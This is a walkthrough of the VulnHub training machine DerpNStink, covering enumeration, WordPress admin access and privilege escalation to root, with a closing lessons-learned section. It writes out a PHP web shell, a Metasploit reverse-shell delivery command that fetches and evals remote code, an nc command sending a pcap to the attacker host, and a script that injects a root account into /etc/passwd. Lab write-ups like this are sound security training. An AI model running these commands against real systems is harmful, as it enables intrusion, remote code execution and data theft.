# DerpNStink - Walkthrough

## Overview

* **Machine Name**: DerpNStink
* **Platform**: VulnHub / Boot-to-Root
* **Difficulty**: Easy / Medium
* **Tags**: Linux, WordPress, PCAP Analysis, Sudo Misconfiguration, Password Cracking

---

## Enumeration

### Host Discovery

An initial local network discovery scan was executed using `arp-scan` to identify the target IP address.

```bash
arp-scan -l

```

The target machine was successfully located at **192.168.29.70**.

```
[+] Target IP Identified: 192.168.29.70

```

### Port Scanning

A comprehensive infrastructure scan was performed using `nmap` to probe all open TCP ports, running services, and operational signatures.

```bash
nmap -p- -A -T4 192.168.29.70

```

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-05 10:02 EDT
Nmap scan report for 192.168.29.70
Host is up (0.00076s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
| http-robots.txt: 2 disallowed entries 
|_/php/ /temporary/
MAC Address: 00:0C:29:78:46:84 (VMware)

```

### Directory Busting

Web asset discovery was launched via `ffuf` on the primary HTTP root directory as well as the mapped path locations found in `robots.txt`.

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.29.70/FUZZ

```

```text
.htaccess               [Status: 403, Size: 289, Words: 21, Lines: 11]
.htpasswd               [Status: 403, Size: 289, Words: 21, Lines: 11]
css                     [Status: 301, Size: 311, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 1298, Words: 130, Lines: 132]
php                     [Status: 301, Size: 311, Words: 20, Lines: 10]
robots.txt              [Status: 200, Size: 53, Words: 4, Lines: 5]
temporary               [Status: 301, Size: 317, Words: 20, Lines: 10]
weblog                  [Status: 301, Size: 314, Words: 20, Lines: 10]

```

Fuzzing subdirectories under `/php/` revealed a database management application console:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.29.70/php/FUZZ

```

```text
phpmyadmin              [Status: 301, Size: 322, Words: 20, Lines: 10]
info.php                [Status: 200, Size: 0, Words: 1, Lines: 1]

```

A subsequent deep directory scan using the `raft-medium-words.txt` collection successfully identified a notable resource directory at `/webnotes`.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://192.168.29.70/FUZZ

```

```text
webnotes                [Status: 301, Size: 316, Words: 20, Lines: 10]

```

### Investigating Web Assets & Notes

Checking `/php/phpmyadmin` with standard administrative credentials (`admin:admin`) proved unsuccessful. Accessing the path at `/temporary/index.html` also resulted in a structural dead end.

However, navigating directly to `/webnotes` exposed internal administrative operational notes indicating a developer session configuration tracking local network domains:

```text
[stinky@DeRPnStiNK /var/www/html ]$ whois derpnstink.local
   Domain Name: derpnstink.local
   Registrar Abuse Contact Email: stinky@derpnstink.local
   ...
[stinky@DeRPnStiNK: /var/www/html/php]~$ ping derpnstink.local
PING derpnstink.local (127.0.0.1) 56(84) bytes of data.

```

> **Domain Mapping**: To correctly access the localized corporate blog structure, the system hostname configuration mapping was updated locally:
> `192.168.29.70 derpnstink.local` was appended to `/etc/hosts`.

---

## Exploitation

### WordPress Entry

Upon updating the local host records, browsing to `[http://derpnstink.local/weblog/](http://derpnstink.local/weblog/)` confirmed a WordPress platform implementation via Wappalyzer signatures.

Reviewing comment histories exposed unauthorized attempts to stage administrative upload components:

Navigating to the default login panel at `/wp-login.php`, access was successfully authorized using trivial credentials:

* **Username**: `admin`
* **Password**: `admin`

### Web Shell Deployment

Leveraging the administrative dashboard access, a malicious inline script execution payload was embedded directly inside the active `slideshow-gallery` plugin architecture:

```php
<?php system($_GET["cmd"]); ?>

```

### Upgrading to Meterpreter

To establish structured process tracking and active terminal control, Metasploit's foundational script host delivery interface was initiated.

```bash
msfconsole
msf > use exploit/multi/script/web_delivery
msf exploit(multi/script/web_delivery) > set srvhost 192.168.29.199
msf exploit(multi/script/web_delivery) > set target 1
msf exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
msf exploit(multi/script/web_delivery) > set lhost 192.168.29.199
msf exploit(multi/script/web_delivery) > set srvport 9876
msf exploit(multi/script/web_delivery) > exploit

```

The system responded with an executable delivery command line sequence:

```bash
php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.29.199:9876/lgyhVm2', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"

```

Executing this payload through the staged slideshow gallery plugin successfully dropped a web server handler session.

```text
[*] Meterpreter session 1 opened (192.168.29.199:4444 -> 192.168.29.70:43354)

```

```bash
meterpreter > shell
whoami
# www-data

```

---

## Privilege Escalation

### Internal Information Gathering

Spawning a pseudo-terminal boundary environment to stabilize execution interactivity:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'

```

Reviewing the localized system user database entries inside `/etc/passwd`:

```bash
grep /bin/bash /etc/passwd

```

```text
root:x:0:0:root:/root:/bin/bash
stinky:x:1001:1001:Uncle Stinky,,,:/home/stinky:/bin/bash
mrderp:x:1000:1000:Mr. Derp,,,:/home/mrderp:/bin/bash

```

An extraction run against the core database deployment credentials stored inside `wp-config.php` exposed plaintext database connectivity parameters:

```bash
cat /var/www/html/weblog/wp-config.php

```

```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'mysql');
define('DB_HOST', 'localhost');

```

### Database Dumping & Hash Cracking

Connecting directly to the localized MySQL engine instance:

```bash
mysql -u root -p'mysql' -e "SELECT user_login, user_pass FROM wordpress.wp_users;"

```

```text
+-------------+------------------------------------+
| user_login  | user_pass                          |
+-------------+------------------------------------+
| unclestinky | $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 |
| admin       | $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ |
+-------------+------------------------------------+

```

The extracted hash structure matching user profile `unclestinky` was piped straight to John the Ripper utilizing the `rockyou` wordlist dictionary:

```bash
john --format=phpass -w=/usr/share/wordlists/rockyou.txt hashes.txt

```

```text
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
wedgie57         (?)     
1g 0:00:01:14 DONE (2026-05-15 09:41)

```

* **Cracked Password**: `wedgie57`

### Pivoting to User: stinky

The cracked string successfully authorized a local context transition to user profile identity `stinky`:

```bash
su stinky
# Password: wedgie57

```

Navigating straight to the localized home directory paths exposed the initial structural user system landmark token:

```bash
cat ~/Desktop/flag.txt

```

```text
flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)

```

---

## Post-Exploitation & Secondary Pivot

### FTP Deep-Dive

User `stinky` reused their core password signature across the local FTP framework. Authenticating over port 21 exposed an unconventional nested folder file hierarchy containing a stored private certificate structure.

```bash
ftp 192.168.29.70

```

```text
Remote system type is UNIX.
ftp> cd files/ssh/ssh/ssh/ssh/ssh/ssh/ssh
ftp> ls
-rwxr-xr-x    1 0        0            1675 Nov 13  2017 key.txt
ftp> get key.txt

```

This exposed key file provides a secondary out-of-band persistent SSH terminal connection entry mechanism for the `stinky` profile.

### Packet Capture Analysis

A backup tracking file (`derpissues.pcap`) staged inside the documents library was safely exfiltrated via network streaming channels back to the attack host environment:

```bash
nc 192.168.29.199 1234 < derpissues.pcap

```

Inspecting the packet logs within Wireshark revealed cleartext authorization handshakes captured from a separate internal service access session for user profile `mrderp`.

* **Extracted Credentials**: `mrderp : derpderpderpderpderpderpderp`

---

## Privilege Escalation to Root

### Sudo Rights Assessment

Switching execution contexts over to the target profile `mrderp`:

```bash
su mrderp
# Password: derpderpderpderpderpderpderp

```

Running explicit privilege evaluations for current execution vectors (`sudo -l`) showed a wildcard matching binary pattern location execute authorization restriction bypass anomaly:

```text
User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*

```

### Exploit Execution

Because any file execution matching the literal naming string profile `/home/mrderp/binaries/derpy*` runs under an absolute administrative framework, a scripted root-injection process execution flow wrapper was safely created:

```bash
mkdir -p ~/binaries

```

Next, an encrypted credential hash structure was compiled using OpenSSL to build an auxiliary administrative identity:

```bash
openssl passwd hacker@123
# Output: lMYfwJF/nQvnc

```

A shell script matching the required wildcard name prefix was then staged to cleanly append our custom root user straight into the system initialization table:

```bash
cat << 'EOF' > ~/binaries/derpy.sh
#!/bin/bash
FILE="/etc/passwd"
LINE="newroot:lMYfwJF/nQvnc:0:0:root:/root:/bin/bash"
echo "$LINE" >> "$FILE"
EOF

chmod +x ~/binaries/derpy.sh

```

Executing the wrapper payload using the validated `sudo` matching context:

```bash
sudo /home/mrderp/binaries/derpy.sh

```

With the user base records successfully modified, authenticating directly into the newly injected superuser container yielded absolute root access:

```bash
su newroot
# Password: hacker@123

whoami
# root

```

---

## Lessons Learned

1. **Password Reuse**: The primary vulnerability chain escalated rapidly because the same password (`wedgie57`) was reused across MySQL, system profiles, and FTP services.
2. **Insecure Storage**: Private SSH keys and sensitive network traffic capture dumps (`.pcap`) should never be stored in world-readable web application pathways or cleartext file shares.
3. **Wildcard Sudo Exploitation**: Restricting executable commands using trailing wildcard matching expressions (like `derpy*`) presents a trivial arbitrary binary name injection vector. Safe path validation requires hardcoding precise, explicit absolute binary strings.